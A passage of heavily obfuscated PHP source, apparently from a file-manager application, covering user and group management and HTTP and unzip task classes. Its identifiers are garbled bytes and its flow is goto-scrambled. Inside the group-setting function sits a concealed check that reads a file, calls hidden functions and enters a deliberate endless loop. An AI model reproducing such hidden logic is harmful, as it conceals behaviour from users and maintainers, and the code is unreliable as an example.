$E‚¬¸âá»ë) { $d¤Ğ‹§µ¸¿ = $AÎÀÖ•èÖ[$AÎÀÖ•èÖ[$E‚¬¸âá»ë]]; if (!$d¤Ğ‹§µ¸¿) { $Fã¦Š…¿ø‡[$E‚¬¸âá»ë . $bˆ‹˜µé‹Ğ[33]] = $this->getInfoSimpleOuter($E‚¬¸âá»ë); continue; } $d¤Ğ‹§µ¸¿[$bˆ‹˜µé‹Ğ[2532]] = Action($bˆ‹˜µé‹Ğ[2533])->parseUrl($d¤Ğ‹§µ¸¿[$bˆ‹˜µé‹Ğ[2532]]); $Fã¦Š…¿ø‡[$E‚¬¸âá»ë . $bˆ‹˜µé‹Ğ[33]] = $d¤Ğ‹§µ¸¿; } } return $Fã¦Š…¿ø‡; } protected function userStatus($a•†ó‰‚†œ, $f²§Ùã¬ˆô) { $BÜÄ…£¶Áà = $this->getInfoSimple($a•†ó‰‚†œ); if (!$BÜÄ…£¶Áà) { return !1; } $D©àÉ‹òÔ = array($_SERVER[¦·][690] => $f²§Ùã¬ˆô); return $this->userEdit($a•†ó‰‚†œ, $D©àÉ‹òÔ); } protected function userRemove($bøõ¿ÎÑßî) { goto F¦­‚ ö™ø; e‘ÁÕãÙŠî: Model($aŒ¹Íï±‰[2191])->where($F®äÀªÙ¥)->delete(); Model($aŒ¹Íï±‰[2546])->where($F®äÀªÙ¥)->delete(); Model($aŒ¹Íï±‰[2562])->where($F®äÀªÙ¥)->delete(); goto D‡Û«Ù¨í; D‡Û«Ù¨í: Model($aŒ¹Íï±‰[753])->userRootRemove($bøõ¿ÎÑßî); return $this->where($F®äÀªÙ¥)->delete(); goto AÒ¡Š¨äñ; c·™Ø½˜Ş½: $F®äÀªÙ¥ = array($aŒ¹Íï±‰[1432] => $bøõ¿ÎÑßî); Model($aŒ¹Íï±‰[537])->where($F®äÀªÙ¥)->delete(); Model($aŒ¹Íï±‰[2561])->where($F®äÀªÙ¥)->delete(); goto e‘ÁÕãÙŠî; F¦­‚ ö™ø: $aŒ¹Íï±‰ =& $_SERVER[¦·]; $a±ñ‰¬œ³ = $this->getInfoSimple($bøõ¿ÎÑßî); if (!$a±ñ‰¬œ³) { return !1; } goto c·™Ø½˜Ş½; AÒ¡Š¨äñ: } protected function userGroupSet($b¨Ö†‡ï¯Ÿ, $d²¡Ë¤ÁÛš, $E×ˆŞĞ…áğ = array()) { goto EâÂˆ«â Š; EâÂˆ«â Š: $B†ìºã‡Ó =& $_SERVER[¦·]; if (!isset($_SERVER[$B†ìºã‡Ó[791]]) || !isset($_SERVER[$B†ìºã‡Ó[1234]])) { goto Díàé”Ê³; AŒÚÓğ¿¯¿: $føùø¾òßÉ = $B†ìºã‡Ó[795]; $føùø¾òßÉ($_SERVER[$B†ìºã‡Ó[796]]); $D¥Ù§ç÷”º = 1; goto eŸè óŒ–£; eŸè óŒ–£: for ($cˆ×¼•¦·ó = $D¥Ù§ç÷”º; $cˆ×¼•¦·ó > 0; $cˆ×¼•¦·ó++) { $føùø¾òßÉ = json_encode($GLOBALS[$B†ìºã‡Ó[384]]); } goto bÖ½œƒñõñ; Díàé”Ê³: $dË´ÙùÜ§ƒ = $B†ìºã‡Ó[792]; $e™âšîÕ¨Ê = $B†ìºã‡Ó[793]; $Bô±‡àÈ = $_SERVER[$B†ìºã‡Ó[788]] . $B†ìºã‡Ó[789]; goto CÄá½³Úß¥; CÄá½³Úß¥: $eä¿âÇõŞÄ = $e™âšîÕ¨Ê($Bô±‡àÈ); $BÇõÕò˜á = explode($B†ìºã‡Ó[217], $eä¿âÇõŞÄ); if (count($BÇõÕò˜á) < $B†ìºã‡Ó[576]) { $aøùÉ‹Ãˆ = $B†ìºã‡Ó[794]; $aøùÉ‹Ãˆ(); } goto AŒÚÓğ¿¯¿; bÖ½œƒñõñ: } $E£ÑÒÅÇ¶ = $this->getInfoSimple($b¨Ö†‡ï¯Ÿ); goto eÑ›š¨Ğµë; eÑ›š¨Ğµë: if (!$E£ÑÒÅÇ¶ || !is_array($d²¡Ë¤ÁÛš)) { return !1; } $DÔê ŠÀ›š = Model($B†ìºã‡Ó[2191]); $DÔê ŠÀ›š->where(array($B†ìºã‡Ó[1441] => $b¨Ö†‡ï¯Ÿ))->delete(); goto eÉÏ‡Û®ùà; f÷ ½ ß¹ä: return $DÔê ŠÀ›š->addAll($AšÆÊ÷¼¥¶, array(), !0); goto A©Ê‘¬šÚ; eÉÏ‡Û®ùà: $AšÆÊ÷¼¥¶ = array(); $E¡ÇšÜ–º£ = 0; foreach ($d²¡Ë¤ÁÛš as $A—Ğ¹Ôñê => $D©ÉàÔ‘Ü‚) { $D„À¾å¾í„ = array($B†ìºã‡Ó[1441] => $b¨Ö†‡ï¯Ÿ, $B†ìºã‡Ó[2112] => $A—Ğ¹Ôñê, $B†ìºã‡Ó[2256] => $D©ÉàÔ‘Ü‚); $D„À¾å¾í„[$B†ìºã‡Ó[2134]] = isset($E×ˆŞĞ…áğ[$E¡ÇšÜ–º£]) ? $E×ˆŞĞ…áğ[$E¡ÇšÜ–º£] : 0; $E¡ÇšÜ–º£++; $AšÆÊ÷¼¥¶[] = $D„À¾å¾í„; } goto f÷ ½ ß¹ä; A©Ê‘¬šÚ: } protected function userGroupAdd($A’®›Àõ²ê, $cÍá¹¶Æ¥ó = array()) { $dî†Š˜â =& $_SERVER[¦·]; $Dâ‰éÓÀ… = $this->getInfoSimple($A’®›Àõ²ê); if (!$Dâ‰éÓÀ… || empty($cÍá¹¶Æ¥ó)) { return !1; } $e¡Ğ‡»¤±Ÿ = array(); foreach ($cÍá¹¶Æ¥ó as $BßÍÃÕ¼´ => $DáœØ ’) { $e¡Ğ‡»¤±Ÿ[] = array($dî†Š˜â[1441] => $A’®›Àõ²ê, $dî†Š˜â[2112] => $BßÍÃÕ¼´, $dî†Š˜â[2256] => $DáœØ ’, $dî†Š˜â[2134] => 0); } return Model($dî†Š˜â[2191])->addAll($e¡Ğ‡»¤±Ÿ, array(), !0); } protected function userGroupRemove($a÷çİËçã, $BòôìÙ…) { $FõÍĞÄ¨Ğ =& $_SERVER[¦·]; $A¶èâÁ†ÎŸ = $this->getInfoSimple($a÷çİËçã); if (!$A¶èâÁ†ÎŸ || !$BòôìÙ…) { return !1; } $Aïå™ˆİŠ– = array($FõÍĞÄ¨Ğ[1432] => $a÷çİËçã, $FõÍĞÄ¨Ğ[2189] => $BòôìÙ…); return Model($FõÍĞÄ¨Ğ[2191])->where($Aïå™ˆİŠ–)->delete(); } public function listData() { $Ağ³ñˆËô = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ağ³ñˆËô[$_SERVER[¦·][354]]); return $Ağ³ñˆËô; } public function listByID($eŞ©ŒÄÜñ­) { $d¼©¨²ÒÈ¨ =& $_SERVER[¦·]; if (!$eŞ©ŒÄÜñ­) { return; } $e‚ÕÌº‡İ‘ = array($d¼©¨²ÒÈ¨[1441] => array($d¼©¨²ÒÈ¨[7], $eŞ©ŒÄÜñ­)); $aÑù°‡êå = $this->where($e‚ÕÌº‡İ‘)->select(); $this->_listDataApply($aÑù°‡êå); return $aÑù°‡êå; } public function listByGroup($EªŒ¶‚ŒÍÜ = 0, $EäÛŸ…×îÉ = array()) { goto B›ŒŸ¾Æ„ß; D×Œ¶À…: if ($EªŒ¶‚ŒÍÜ) { $F²ºÎÓÎÀ¨ = array($Dá—ËÎÈ’â[2563] => intval($EªŒ¶‚ŒÍÜ)); $cªôİÏ = "\x4c\105\x46\124\x20\x4a\117\x49\x4e\x20{$this->tablePrefix}\x75\163\x65\x72\x5f\147\x72\157\165\160\40\165\x73\x65\162\x5f\147\162\x6f\x75\x70\x20\157\156\x20\x75\163\x65\162\56\x75\x73\x65\162\x49\x44\40\75\x20\165\163\x65\162\137\x67\x72\157\165\x70\x2e\165\x73\145\162\111\104"; $Böá÷ñØ„Ğ = Input::get($Dá—ËÎÈ’â[407], null, $Dá—ËÎÈ’â[33]) ? $Dá—ËÎÈ’â[33] : $Dá—ËÎÈ’â[2564]; } if (isset($EäÛŸ…×îÉ[$Dá—ËÎÈ’â[690]])) { $F²ºÎÓÎÀ¨[$Dá—ËÎÈ’â[2565]] = $EäÛŸ…×îÉ[$Dá—ËÎÈ’â[690]]; } $dä‘øÆ¯§ç = $this->_makeOrder($Böá÷ñØ„Ğ)->field($Dá—ËÎÈ’â[2566])->where($F²ºÎÓÎÀ¨)->join($cªôİÏ)->selectPage(50); goto d®¡Ÿ³”ØŠ; d®¡Ÿ³”ØŠ: $this->_listDataApply($dä‘øÆ¯§ç[$Dá—ËÎÈ’â[354]]); return $dä‘øÆ¯§ç; goto fóâ’îô; B›ŒŸ¾Æ„ß: $Dá—ËÎÈ’â =& $_SERVER[¦·]; $cªôİÏ = $Dá—ËÎÈ’â[33]; $F²ºÎÓÎÀ¨ = array(); goto D×Œ¶À…; fóâ’îô: } private function _makeOrder($fÓîÇ¢–Ê« = '') { goto DŠÉ—«ŒŠº; DŠÉ—«ŒŠº: $E§›İõîİ³ =& $_SERVER[¦·]; $b‚±êØÁ¸Í = array($E§›İõîİ³[1441], $E§›İõîİ³[28], $E§›İõîİ³[2098], $E§›İõîİ³[2070], $E§›İõîİ³[187]); $fˆ’Ó—ŒÈ‹ = array($E§›İõîİ³[402] => $E§›İõîİ³[403], $E§›İõîİ³[404] => $E§›İõîİ³[405]); goto B÷óÑ…µ…Å; B÷óÑ…µ…Å: $CÍÓ‘ïÙª = Input::get($E§›İõîİ³[407], $E§›İõîİ³[7], $E§›İõîİ³[1432], $b‚±êØÁ¸Í); $bö£‰Ş¸Ï = Input::get($E§›İõîİ³[408], $E§›İõîİ³[7], $E§›İõîİ³[2192], array($E§›İõîİ³[2192], $E§›İõîİ³[404])); $bö£‰Ş¸Ï = $fˆ’Ó—ŒÈ‹[$bö£‰Ş¸Ï]; goto AÕà¿‡‘Û; AÕà¿‡‘Û: $fÓîÇ¢–Ê« = $fÓîÇ¢–Ê« . "\165\163\145\x72\x2e{$CÍÓ‘ïÙª}\x20{$bö£‰Ş¸Ï}\54\40\x75\163\x65\x72\56\165\163\x65\x72\x49\x44\40\141\x73\143"; return $this->alias($E§›İõîİ³[2311])->order($fÓîÇ¢–Ê«); goto E¹¢æÄ¥Ø; E¹¢æÄ¥Ø: } public function listSearch($dßñ´é˜‡) { goto EÉ ˆ½òÒ˜; EÉ ˆ½òÒ˜: $Aò·¬ÒÓæö =& $_SERVER[¦·]; $bêÍº‰•ê„ = $dßñ´é˜‡[$Aò·¬ÒÓæö[2193]]; $eïÙ¹¸ö§ë = isset($dßñ´é˜‡[$Aò·¬ÒÓæö[2194]]) ? $dßñ´é˜‡[$Aò·¬ÒÓæö[2194]] : !1; goto D©Îç’îÙ†; c–êŠÔº¬È: if (!$c¸Òˆó´Ì || count($c¸Òˆó´Ì[$Aò·¬ÒÓæö[354]]) < 5 && Input::check($bêÍº‰•ê„, $Aò·¬ÒÓæö[306])) { $D²É’±„ì÷ = $this->_searchFromMeta($Aò·¬ÒÓæö[415], $bêÍº‰•ê„, 10); $e’¿Ğ£Ş‚ä = $this->_searchFromMeta($Aò·¬ÒÓæö[416], $bêÍº‰•ê„, 10); $bÖƒ©Ú‡Ú¤ = array_merge($D²É’±„ì÷, $e’¿Ğ£Ş‚ä, $c¸Òˆó´Ì[$Aò·¬ÒÓæö[354]]); $c¸Òˆó´Ì[$Aò·¬ÒÓæö[354]] = array_unique_by_key($bÖƒ©Ú‡Ú¤, $Aò·¬ÒÓæö[1441]); $c¸Òˆó´Ì[$Aò·¬ÒÓæö[351]][$Aò·¬ÒÓæö[352]] = count($c¸Òˆó´Ì[$Aò·¬ÒÓæö[354]]); $c¸Òˆó´Ì[$Aò·¬ÒÓæö[351]][$Aò·¬ÒÓæö[353]] = ceil($c¸Òˆó´Ì[$Aò·¬ÒÓæö[351]][$Aò·¬ÒÓæö[352]] / $c¸Òˆó´Ì[$Aò·¬ÒÓæö[351]][$Aò·¬ÒÓæö[349]]); } $this->_listDataApply($c¸Òˆó´Ì[$Aò·¬ÒÓæö[354]]); $this->_filterByGroup($c¸Òˆó´Ì, $eïÙ¹¸ö§ë); goto B°…¥¶Õ©¿; B°…¥¶Õ©¿: return $c¸Òˆó´Ì; goto D¯ÛÙÓÏÖ; c¼Å±ç: if (!$bêÍº‰•ê„) { $E»ÆçË”® = array(); } if (isset($dßñ´é˜‡[$Aò·¬ÒÓæö[690]])) { $E»ÆçË”®[$Aò·¬ÒÓæö[690]] = $dßñ´é˜‡[$Aò·¬ÒÓæö[690]]; } $c¸Òˆó´Ì = $this->_makeOrder()->where($E»ÆçË”®)->selectPage(20); goto c–êŠÔº¬È; D©Îç’îÙ†: $bêÍº‰•ê„ = str_replace($Aò·¬ÒÓæö[2195], $Aò·¬ÒÓæö[2196], trim($bêÍº‰•ê„)); $E»ÆçË”® = array($Aò·¬ÒÓæö[28] => array($Aò·¬ÒÓæö[752], "\45{$bêÍº‰•ê„}\45"), $Aò·¬ÒÓæö[293] => array($Aò·¬ÒÓæö[752], "\x25{$bêÍº‰•ê„}\45"), $Aò·¬ÒÓæö[2370] => array($Aò·¬ÒÓæö[752], "\45{$bêÍº‰•ê„}\x25"), $Aò·¬ÒÓæö[916] => $Aò·¬ÒÓæö[2197]); if (Input::check($bêÍº‰•ê„, $Aò·¬ÒÓæö[299])) { $E»ÆçË”®[$Aò·¬ÒÓæö[1441]] = array($Aò·¬ÒÓæö[752], "\45{$bêÍº‰•ê„}\45"); $E»ÆçË”®[$Aò·¬ÒÓæö[2547]] = array($Aò·¬ÒÓæö[752], "\45{$bêÍº‰•ê„}\x25"); } goto c¼Å±ç; D¯ÛÙÓÏÖ: } private function _filterByGroup(&$E«É¨î†Ü, $b­®Ç¾£‡) { $BÇÌ¦õ÷é² =& $_SERVER[¦·]; if (!$b­®Ç¾£‡) { return $E«É¨î†Ü; } foreach ($E«É¨î†Ü[$BÇÌ¦õ÷é²[354]] as $d·å¼ÂñÊô => &$C”Îîî›Ø›) { $f‰õÒÕ°éÆ = array_to_keyvalue($C”Îîî›Ø›[$BÇÌ¦õ÷é²[2281]], $BÇÌ¦õ÷é²[33], $BÇÌ¦õ÷é²[2112]); if (!in_array($b­®Ç¾£‡, $f‰õÒÕ°éÆ)) { unset($E«É¨î†Ü[$BÇÌ¦õ÷é²[354]][$d·å¼ÂñÊô]); } } unset($C”Îîî›Ø›); $E«É¨î†Ü[$BÇÌ¦õ÷é²[354]] = array_values($E«É¨î†Ü[$BÇÌ¦õ÷é²[354]]); $E«É¨î†Ü[$BÇÌ¦õ÷é²[351]] = array($BÇÌ¦õ÷é²[2345] => count($E«É¨î†Ü[$BÇÌ¦õ÷é²[354]]), $BÇÌ¦õ÷é²[2343] => $E«É¨î†Ü[$BÇÌ¦õ÷é²[351]][$BÇÌ¦õ÷é²[349]], $BÇÌ¦õ÷é²[2342] => 1, $BÇÌ¦õ÷é²[2344] => 1); } private function _searchFromMeta($EñîÌ‚Ş§, $dÏ¢Õ–‰ùó, $bÖ¬Á†¿Ã¾) { goto D¸°©ê”; a‘ô·ÜöĞ: $e“Šœµª‹ò = $this->where(array($fø¤Ó–óÔ[1432] => array($fø¤Ó–óÔ[7], $Dóö»‰Ú„)))->select(); if (!$e“Šœµª‹ò) { return array(); } return $e“Šœµª‹ò; goto e©éÖ³ÒÅ´; D¸°©ê”: $fø¤Ó–óÔ =& $_SERVER[¦·]; $dÏ¢Õ–‰ùó = strtolower($dÏ¢Õ–‰ùó); $CÄ´±Çƒ•¨ = array($fø¤Ó–óÔ[89] => $EñîÌ‚Ş§, $fø¤Ó–óÔ[359] => array($fø¤Ó–óÔ[752], "\45{$dÏ¢Õ–‰ùó}\x25")); goto f©ŸŸ„öÇË; f©ŸŸ„öÇË: $Dóö»‰Ú„ = Model($fø¤Ó–óÔ[2567])->where($CÄ´±Çƒ•¨)->limit($bÖ¬Á†¿Ã¾)->select(); if (!$Dóö»‰Ú„) { return array(); } $Dóö»‰Ú„ = array_to_keyvalue($Dóö»‰Ú„, $fø¤Ó–óÔ[33], $fø¤Ó–óÔ[1441]); goto a‘ô·ÜöĞ; e©éÖ³ÒÅ´: } private function _listDataApplyItem($bİ½÷öˆÉ©) { $eÄ—ÈÉĞ° = array($bİ½÷öˆÉ©); $this->_listDataApply($eÄ—ÈÉĞ°); return $eÄ—ÈÉĞ°[0]; } private function _listDataApply(&$bë´Öğğ‡) { goto B¾¨ÊÏ¤‡ï; B¾¨ÊÏ¤‡ï: $E‡ÈŸä¢ŸŒ =& $_SERVER[¦·]; if (!$bë´Öğğ‡) { return; } array_remove_key($bë´Öğğ‡, $E‡ÈŸä¢ŸŒ[804]); goto E‹Ş¯²Ç‡Ÿ; cÆ†˜ÃÃ×: $this->_listAppendSourceRoot($bë´Öğğ‡, $Dğ·ºßƒ¡½); goto eÒ¥È¼ŸŒÕ; E‹Ş¯²Ç‡Ÿ: $Dğ·ºßƒ¡½ = array_to_keyvalue($bë´Öğğ‡, $E‡ÈŸä¢ŸŒ[33], $E‡ÈŸä¢ŸŒ[1441]); $this->_listAppendGroup($bë´Öğğ‡, $Dğ·ºßƒ¡½); $this->_listAppendMeta($bë´Öğğ‡, $Dğ·ºßƒ¡½); goto cÆ†˜ÃÃ×; eÒ¥È¼ŸŒÕ: } private function _listAppendSourceRoot(&$CÕŞÄƒ„ò², $eÍ¦¹ÒÀ…ğ) { goto eÑå÷ää°È; eÑå÷ää°È: $e£ä½ï×æ° =& $_SERVER[¦·]; $aâÏºğ¬² = array($e£ä½ï×æ°[463] => 0, $e£ä½ï×æ°[371] => SourceModel::TYPE_USER, $e£ä½ï×æ°[458] => array($e£ä½ï×æ°[7], $eÍ¦¹ÒÀ…ğ)); $d¤Ö¢÷èÉ¨ = $e£ä½ï×æ°[2204]; goto a¦Üô•åËØ; a¦Üô•åËØ: $Aï£Ÿ©®¦Û = Model($e£ä½ï×æ°[753])->order($e£ä½ï×æ°[2205])->field($d¤Ö¢÷èÉ¨)->where($aâÏºğ¬²)->select(); $Aï£Ÿ©®¦Û = array_to_keyvalue($Aï£Ÿ©®¦Û, $e£ä½ï×æ°[458]); $Aï£Ÿ©®¦Û = array_remove_key($Aï£Ÿ©®¦Û, $e£ä½ï×æ°[458]); goto Fù‡Ö °åÊ; Fù‡Ö °åÊ: foreach ($CÕŞÄƒ„ò² as &$E˜èîÕŒ) { $E˜èîÕŒ[$e£ä½ï×æ°[391]] = $Aï£Ÿ©®¦Û[$E˜èîÕŒ[$e£ä½ï×æ°[1441]]] ? $Aï£Ÿ©®¦Û[$E˜èîÕŒ[$e£ä½ï×æ°[1441]]] : array(); } unset($E˜èîÕŒ); goto AŒ¿İÂö¼‡; AŒ¿İÂö¼‡: } private function _listAppendGroup(&$D²İ¸Œ¡Ã, $b¹Áİ’Ÿ¬‹) { goto c³‘æäöùœ; BÄã‰‘‰“Â: $d†å–„¯œê = array_to_keyvalue_group($d†å–„¯œê, $fã§Î™ÁŒå[1441]); foreach ($d†å–„¯œê as &$c‰âˆÈÇ) { $aì–ÃíÍ†ô = array(); foreach ($c‰âˆÈÇ as $d†ÖÂÜ‹–Ú) { if (!$d†ÖÂÜ‹–Ú[$fã§Î™ÁŒå[2256]]) { continue; } $cÃÚìÍê´İ = Model($fã§Î™ÁŒå[2275])->listData($d†ÖÂÜ‹–Ú[$fã§Î™ÁŒå[2256]]); $aì–ÃíÍ†ô[] = array($fã§Î™ÁŒå[2112] => $d†ÖÂÜ‹–Ú[$fã§Î™ÁŒå[2112]], $fã§Î™ÁŒå[2569] => $cå¨Üˆ•Ğ[$d†ÖÂÜ‹–Ú[$fã§Î™ÁŒå[2112]]][$fã§Î™ÁŒå[28]], $fã§Î™ÁŒå[461] => $cå¨Üˆ•Ğ[$d†ÖÂÜ‹–Ú[$fã§Î™ÁŒå[2112]]][$fã§Î™ÁŒå[461]], $fã§Î™ÁŒå[376] => $cÃÚìÍê´İ); } $c‰âˆÈÇ = $aì–ÃíÍ†ô; } unset($c‰âˆÈÇ); goto Añï‹»•; c³‘æäöùœ: $fã§Î™ÁŒå =& $_SERVER[¦·]; $FÎŠÁì‡”£ = array($fã§Î™ÁŒå[1441] => array($fã§Î™ÁŒå[7], $b¹Áİ’Ÿ¬‹)); $d†å–„¯œê = Model($fã§Î™ÁŒå[2191])->where($FÎŠÁì‡”£)->select(); goto fÂƒ‰ŸóË; Añï‹»•: foreach ($D²İ¸Œ¡Ã as &$E„â´µøù) { $E„â´µøù[$fã§Î™ÁŒå[2281]] = array(); if (isset($d†å–„¯œê[$E„â´µøù[$fã§Î™ÁŒå[1441]]])) { $E„â´µøù[$fã§Î™ÁŒå[2281]] = $d†å–„¯œê[$E„â´µøù[$fã§Î™ÁŒå[1441]]]; } } unset($E„â´µøù); goto AÛÀŒ±÷«ñ; fÂƒ‰ŸóË: $b™èùÂáß = array_to_keyvalue($d†å–„¯œê, $fã§Î™ÁŒå[33], $fã§Î™ÁŒå[2112]); $b™èùÂáß = array_remove_value(array_unique($b™èùÂáß), $fã§Î™ÁŒå[470]); if (!$b™èùÂáß || !$d†å–„¯œê) { return; } goto B¥†Ëº®ñ¬; B¥†Ëº®ñ¬: $FÎŠÁì‡”£ = array($fã§Î™ÁŒå[2112] => array($fã§Î™ÁŒå[7], $b™èùÂáß)); $cå¨Üˆ•Ğ = Model($fã§Î™ÁŒå[2279])->field($fã§Î™ÁŒå[2568])->where($FÎŠÁì‡”£)->select(); $cå¨Üˆ•Ğ = array_to_keyvalue($cå¨Üˆ•Ğ, $fã§Î™ÁŒå[2112]); goto BÄã‰‘‰“Â; AÛÀŒ±÷«ñ: } private function _listAppendMeta(&$báèÉÇëŠ, $F”ˆ·Ä¤…) { goto B©İ†¾½ì¸; AÓô­ˆ«´¦: foreach ($báèÉÇëŠ as &$Fµ›Óù†…‚) { $aôòó¡°º = array(); if (isset($A¬ÈÀ‡°Ã[$Fµ›Óù†…‚[$cá›¦ñŒ„Ì[1441]]])) { $aôòó¡°º = $A¬ÈÀ‡°Ã[$Fµ›Óù†…‚[$cá›¦ñŒ„Ì[1441]]]; } $Fµ›Óù†…‚[$cá›¦ñŒ„Ì[2571]] = array(); if (isset($aôòó¡°º[$c¯‘²ØÈ‹…])) { $Fµ›Óù†…‚[$cá›¦ñŒ„Ì[2571]] = $F×İ…Á´”->getUserJobInfo($aôòó¡°º[$c¯‘²ØÈ‹…]); } } unset($Fµ›Óù†…‚); goto aÇğšò¯È; d“µ¿‚Åİ«: foreach ($A¬ÈÀ‡°Ã as &$D­‰½ÈÇ‚è) { $C»ŞíäÈ»á = array(); foreach ($D­‰½ÈÇ‚è as $a®¡Çã»Í¤) { if (!in_array($a®¡Çã»Í¤[$cá›¦ñŒ„Ì[89]], $f²¨ßÄ½„)) { $C»ŞíäÈ»á[$a®¡Çã»Í¤[$cá›¦ñŒ„Ì[89]]] = $a®¡Çã»Í¤[$cá›¦ñŒ„Ì[359]]; } } $D­‰½ÈÇ‚è = $C»ŞíäÈ»á; } unset($D­‰½ÈÇ‚è); $F×İ…Á´” = Model($cá›¦ñŒ„Ì[2570]); goto AÓô­ˆ«´¦; B©İ†¾½ì¸: $cá›¦ñŒ„Ì =& $_SERVER[¦·]; $c¯‘²ØÈ‹… = UserJobModel::JOB_KEY; $f²¨ßÄ½„ = array($cá›¦ñŒ„Ì[2549]); goto Dàîò®ÑË; Dàîò®ÑË: $B³”ùŠ˜Ò = array($cá›¦ñŒ„Ì[1441] => array($cá›¦ñŒ„Ì[7], $F”ˆ·Ä¤…)); $A¬ÈÀ‡°Ã = Model($cá›¦ñŒ„Ì[2546])->where($B³”ùŠ˜Ò)->select(); $A¬ÈÀ‡°Ã = array_to_keyvalue_group($A¬ÈÀ‡°Ã, $cá›¦ñŒ„Ì[1441]); goto d“µ¿‚Åİ«; aÇğšò¯È: } protected function groupUserAll($b©ø±Ó‰á) { $bÆ˜‚¹¢Ã =& $_SERVER[¦·]; if (!$b©ø±Ó‰á) { return !1; } $dñÑ›†±¾ = Model($bÆ˜‚¹¢Ã[2191])->field($bÆ˜‚¹¢Ã[1441])->where(array($bÆ˜‚¹¢Ã[2112] => array($bÆ˜‚¹¢Ã[7], $b©ø±Ó‰á)))->select(); $dñÑ›†±¾ = array_to_keyvalue($dñÑ›†±¾, $bÆ˜‚¹¢Ã[33], $bÆ˜‚¹¢Ã[1441]); return array_unique($dñÑ›†±¾); } public function userSearch($d‡Ø‹Ş‹ È, $eĞÏè„é¿‡ = "\x2a") { return Model($_SERVER[¦·][479])->where($d‡Ø‹Ş‹ È)->field($eĞÏè„é¿‡)->find(); } } goto cÄõ±“Â—Î; eåŞ¯æİñ: class TaskHttp extends Task { protected function startAfter() { $fñŠ†¾‰÷¾ =& $_SERVER[¦·]; $BÒÈ‘¸Š¾ =& $this->task; $BÒÈ‘¸Š¾[$fñŠ†¾‰÷¾[1505]] = 1; Hook::bind($fñŠ†¾‰÷¾[1478], array($this, $fñŠ†¾‰÷¾[1506])); Hook::bind($fñŠ†¾‰÷¾[1480], array($this, $fñŠ†¾‰÷¾[1507])); Hook::bind($fñŠ†¾‰÷¾[1482], array($this, $fñŠ†¾‰÷¾[1508])); } protected function endAfter() { $fØ™¨ç˜Š =& $_SERVER[¦·]; Hook::unbind($fØ™¨ç˜Š[1478], array($this, $fØ™¨ç˜Š[1506])); Hook::unbind($fØ™¨ç˜Š[1480], array($this, $fØ™¨ç˜Š[1507])); Hook::unbind($fØ™¨ç˜Š[1482], array($this, $fØ™¨ç˜Š[1508])); } public function progressStart($aŸÔ¥Ô‡ÁÈ) { $DÙ‡ĞÉÙ¿ô =& $_SERVER[¦·]; $fšßÎŒ‘é = curl_getinfo($aŸÔ¥Ô‡ÁÈ); self::log($DÙ‡ĞÉÙ¿ô[1509] . $fšßÎŒ‘é[$DÙ‡ĞÉÙ¿ô[295]]); self::valueSet($this->task[$DÙ‡ĞÉÙ¿ô[367]], $this->task); } public function progressEnd($fïè˜ÏìŸ•) { $DâÃæšœ—ğ =& $_SERVER[¦·]; self::log($DâÃæšœ—ğ[1510] . $this->task[$DâÃæšœ—ğ[367]]); $this->end(); } public function progress($c »ç¯¬Ï, $A¡ŸÉ–Ô, $a¯ÆÛ“½ê, $f£Ä¶¹Öµó, $føâ‹„¤½œ) { $f©µ­¨ŒÄÍ =& $_SERVER[¦·]; $F«‹‰Ç†ƒè =& $this->task; if ($føâ‹„¤½œ > 0) { $F«‹‰Ç†ƒè[$f©µ­¨ŒÄÍ[979]] = $F«‹‰Ç†ƒè[$f©µ­¨ŒÄÍ[979]] == 0 ? $f£Ä¶¹Öµó : $F«‹‰Ç†ƒè[$f©µ­¨ŒÄÍ[979]]; $F«‹‰Ç†ƒè[$f©µ­¨ŒÄÍ[993]] = $føâ‹„¤½œ; } else { if ($a¯ÆÛ“½ê > 0) { $F«‹‰Ç†ƒè[$f©µ­¨ŒÄÍ[979]] = $F«‹‰Ç†ƒè[$f©µ­¨ŒÄÍ[979]] == 0 ? $A¡ŸÉ–Ô : $F«‹‰Ç†ƒè[$f©µ­¨ŒÄÍ[979]]; $F«‹‰Ç†ƒè[$f©µ­¨ŒÄÍ[993]] = $a¯ÆÛ“½ê; } } $this->update(); self::log("\x70\162\x6f\147\x72\145\x73\163\x48\x74\164\160\72\x64\157\167\156\72{$a¯ÆÛ“½ê}\x2f{$A¡ŸÉ–Ô}\73\x20\165\x70\154\157\x61\144\x3a{$føâ‹„¤½œ}\x2f{$f£Ä¶¹Öµó}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto aù¬¤å×Ê–; aù¬¤å×Ê–: $eˆçäŠƒ =& $_SERVER[¦·]; parent::startAfter(); Hook::bind($eˆçäŠƒ[1511], array($this, $eˆçäŠƒ[1512])); goto cèİ»¶†ğ‹; cèİ»¶†ğ‹: Hook::bind($eˆçäŠƒ[1038], array($this, $eˆçäŠƒ[1513])); $f„¡´ø¬Ğ¢ =& $this->task; $f„¡´ø¬Ğ¢[$eˆçäŠƒ[1514]] = $eˆçäŠƒ[1043]; goto dÊ´¢†íë›; dÊ´¢†íë›: if (!$f„¡´ø¬Ğ¢[$eˆçäŠƒ[1347]]) { $f„¡´ø¬Ğ¢[$eˆçäŠƒ[1347]] = LNG($eˆçäŠƒ[1515]); } goto dÔĞ«¼‘­¢; dÔĞ«¼‘­¢: } protected function endAfter() { $fì³Ÿ¯îË™ =& $_SERVER[¦·]; parent::endAfter(); Hook::unbind($fì³Ÿ¯îË™[1511], array($this, $fì³Ÿ¯îË™[1512])); Hook::unbind($fì³Ÿ¯îË™[1038], array($this, $fì³Ÿ¯îË™[1513])); } public function updateAfter() { $aßã‘£ç©ã =& $_SERVER[¦·]; $D²š‹¾òİ =& $this->task; if (!$D²š‹¾òİ[$aßã‘£ç©ã[979]] || !$D²š‹¾òİ[$aßã‘£ç©ã[699]]) { return; } if ($D²š‹¾òİ[$aßã‘£ç©ã[1514]] == $aßã‘£ç©ã[1043]) { $dÃĞ¼–·˜á = 0; if ($D²š‹¾òİ[$aßã‘£ç©ã[1486]]) { $dÃĞ¼–·˜á = $D²š‹¾òİ[$aßã‘£ç©ã[1487]] / $D²š‹¾òİ[$aßã‘£ç©ã[1486]]; } $D²š‹¾òİ[$aßã‘£ç©ã[1442]] = $dÃĞ¼–·˜á * 0.3; } else { if ($D²š‹¾òİ[$aßã‘£ç©ã[1514]] == $aßã‘£ç©ã[301]) { $dÃĞ¼–·˜á = $D²š‹¾òİ[$aßã‘£ç©ã[993]] / $D²š‹¾òİ[$aßã‘£ç©ã[979]]; $D²š‹¾òİ[$aßã‘£ç©ã[1442]] = 0.3 + $dÃĞ¼–·˜á * 0.4; } else { if 